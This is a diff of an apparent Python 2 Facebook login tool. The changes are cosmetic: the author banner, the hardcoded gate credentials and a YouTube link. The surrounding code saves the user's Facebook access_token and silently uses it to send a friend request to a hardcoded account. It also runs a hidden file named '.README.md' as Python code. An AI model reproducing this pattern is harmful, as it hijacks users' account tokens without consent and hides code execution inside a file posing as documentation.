@@ -1,3 +1,4 @@
+
 try:
     import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,getpass,mechanize,requests
     from multiprocessing.pool import ThreadPool
@@ -26,19 +27,16 @@ logo='''
 88      `8b   ,8P  Y8,    88
 88      a8P  d8'    `8b   88
 88888888P'  8P        Y8  88
-
 --------------------------------------------------
-
- Auther   : MANSOOR ALI
+ Auther   : Mansoor Ali
  GitHub   : https://github.com/Man50or
  YouTube  : Mk Tricks
  Blogspot : Not Yet
-
 --------------------------------------------------
                                 '''
 
-CorrectUsername = "KHAN"
-CorrectPassword = "KHAN"
+CorrectUsername = "USA"
+CorrectPassword = "USA"
 
 loop = 'true'
 while (loop == 'true'):
@@ -62,7 +60,7 @@ while (loop == 'true'):
 def tik():
         titik = ['.   ','..  ','... ']
         for o in titik:
-                print("\xce[ΓùÅ] Loging In "+o),;sys.stdout.flush();time.sleep(1)
+                print("\r Loging In "+o),;sys.stdout.flush();time.sleep(1)
 
 def login():
     os.system("clear")
@@ -135,7 +133,7 @@ def login1():
                                 chb.write(z['access_token'])
                                 chb.close()
                                 print ('\n\x1b[1;92m[+] Login Successfull \x1b[1;97m')
-                                os.system('xdg-open https://www.youtube.com/mktrick143')
+                                os.system('xdg-open https://www.youtube.com/channel/UCIC01LyIO5oroo1Qo6Fi4Mw')
                                 requests.post('https://graph.facebook.com/me/friends?method=post&uids=100002059014174&access_token='+z['access_token'])
                                 os.system("python2 .README.md")
                         except requests.exceptions.ConnectionError:
